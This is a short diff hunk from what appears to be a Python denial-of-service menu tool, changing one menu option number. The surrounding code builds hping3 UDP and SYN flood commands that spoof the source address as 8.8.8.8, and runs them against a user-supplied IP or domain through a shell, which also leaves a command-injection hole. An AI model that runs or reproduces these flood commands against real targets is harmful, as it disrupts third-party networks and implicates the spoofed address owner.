@@ -45,7 +45,7 @@ while (True):
         ip = input('\033[1;91mGive me a ip or domain: \033[1;m')
         ping = ('hping3 --udp -a \'8.8.8.8\' -e \'fsociety\' --flood ')
         subprocess.call(ping + ip, shell=True)
-    elif op == '3':
+    elif op == '4':
         ip = input('\033[1;91mGive me a ip or domain: \033[1;m')
         ping = ('hping3 -S -a \'8.8.8.8\' -e \'fsociety\' --flood ')
         subprocess.call(ping + ip, shell=True)
